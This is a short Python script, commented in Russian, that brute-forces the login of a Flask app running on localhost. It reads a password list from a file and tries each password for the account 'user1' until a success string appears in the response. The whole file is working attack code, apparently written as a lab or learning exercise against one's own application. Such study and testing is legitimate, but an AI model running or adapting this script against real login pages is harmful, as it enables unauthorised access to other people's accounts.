import requests
from bs4 import BeautifulSoup as Soup
import sys
import hashlib

# Получаем аргументы командной строки
script, filename, success_message = sys.argv

# Открываем файл со списком паролей
with open(filename) as txt:
    passwords = txt.readlines()

# Настройка цели и сессии
url = 'http://127.0.0.1:5000/'  # URL вашего Flask-приложения
session = requests.Session()

# Функция для проверки успешного входа
def check_success(html):
    return success_message in html

# Запуск атаки методом brute force
print('Running brute force attack...')
for password in passwords:
    password = password.strip()
    print('Trying password: ' + password)

    # Отправляем запрос на вход в систему
    payload = {'username': 'user1', 'password': password}
    response = session.get(url, params=payload)
    
    if check_success(response.text):
        print('Success! Password is: ' + password)
        break
else:
    print('Brute force attack failed. No matches found.')